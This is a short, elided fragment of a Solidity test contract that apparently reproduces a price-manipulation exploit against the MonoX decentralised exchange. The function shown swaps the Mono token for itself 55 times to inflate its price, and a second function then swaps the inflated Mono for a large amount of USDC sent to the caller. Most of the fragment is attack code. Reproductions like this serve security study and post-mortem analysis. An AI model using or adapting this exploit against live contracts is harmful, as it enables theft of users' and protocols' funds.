...
contract ContractTest is DSTest {
    ...
    function Swap_Mono_for_Mono_55_Times() internal{
        ...
        for(uint256 i=0;i < 55; i++){
            ...
            monoswap.swapExactTokenForToken(Mono_Token_Address,Mono_Token_Address,Amount_Of_MonoToken_On_XPool-1,0,address(this),block.timestamp);
    ...
    function Swap_Mono_For_USDC() internal{
        ...
        monoswap.swapTokenForExactToken(Mono_Token_Address,USDC_Address,Amoount_Of_Mono_On_This,4000000000000,msg.sender,block.timestamp);
    }
